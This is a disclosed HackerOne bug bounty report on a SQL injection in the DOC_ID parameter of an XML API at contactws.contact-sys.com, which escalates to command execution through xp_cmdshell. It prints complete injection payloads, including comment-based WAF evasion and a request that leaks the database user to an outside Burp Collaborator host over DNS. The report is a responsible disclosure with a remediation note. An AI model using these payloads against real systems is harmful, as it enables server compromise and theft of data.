---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1104111'
original_report_id: '1104111'
title: Remote Code Execution on contactws.contact-sys.com via SQL injection in TPrabhuObject.BeginOrder
  in parameter DOC_ID
weakness: Code Injection
team_handle: qiwi
created_at: '2021-02-16T09:49:51.031Z'
disclosed_at: '2021-04-14T08:35:06.041Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 52
asset_identifier: '*.contact-sys.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# Remote Code Execution on contactws.contact-sys.com via SQL injection in TPrabhuObject.BeginOrder in parameter DOC_ID

## Metadata

- HackerOne Report ID: 1104111
- Weakness: Code Injection
- Program: qiwi
- Disclosed At: 2021-04-14T08:35:06.041Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary

The API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `DOC_ID` parameter on the `TPrabhuObject` operation `BeginOrder` to inject arbitrary SQL statements into the underlying prepared statement. This leads to Remote Code Execution on the server and full database access to the underpinning database.

## Technical details

The interface on `contactws.contact-sys.com:3456` offers a test environment for CONTACT integrators to test their integrations. It accepts `<REQUEST/>` messages to the AppServ object.

After my similar reports from last year (See #816560, #816254, #816086) I decided to continue digging, and found the object class `TPrabhuObject` with action `BeginOrder`, which appeared to contain an SQL vulnerability, as evidenced by this request:

```xml
<REQUEST OBJECT_CLASS="TPrabhuObject" ACTION="BeginOrder" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```
```xml
<RESPONSE SIGN_IT="1" RE="-6068" ERR_TEXT="Incorrect syntax near '='" GLOBAL_VERSION="15.11.2013 12:37:40" GLOBAL_VERSION_SERVER="18.03.2018 21:03:00"/>
```

By brute-forcing attributes in the request, I discovered that the `DOC_ID` parameter was vulnerable:
```xml
<REQUEST OBJECT_CLASS="TPrabhuObject" DOC_ID="abc" ACTION="BeginOrder" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```

```xml
<RESPONSE SIGN_IT="1" RE="-6068" ERR_TEXT="Invalid column name 'abc'" GLOBAL_VERSION="15.11.2013 12:37:40" GLOBAL_VERSION_SERVER="18.03.2018 21:03:00"/>
```


To exploit the vulnerability, it is possible to append an arbitrary number of SQL statements with the `;` delimiter, e.g. with `DOC_ID` set to:

```sql
3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3
```

Note the use of the comments `/* ... */` which are needed to bypass the WAF that was configured after my reports from last year.

## Steps to reproduce

1. Execute the following request (change the burp collaborator URL to your own);

    ```http
    POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml
    
    <REQUEST OBJECT_CLASS="TPrabhuObject" ACTION="BeginOrder" DOC_ID="3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```

4. Notice that the server waits for a while when it's executing the `ping` command, and observe your Burp Collaborator to see the DNS resolution of the ping request:

    {F1197216}

3. Note the DNS request contains `0x7300740065006e0064005f00610064006d00`, which decodes to `stend_admin`, the `SYSTEM_USER` name.

## Disclaimer

Note that I stopped all further testing after successfully confirming the `ping` command during validation of this bug, and after successfully leaking the `SYSTEM_USER` variable.

## Recommendation

SQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query. See the external references below for remediation details.

## References

[OWASP Prevention cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)

## Impact

By executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
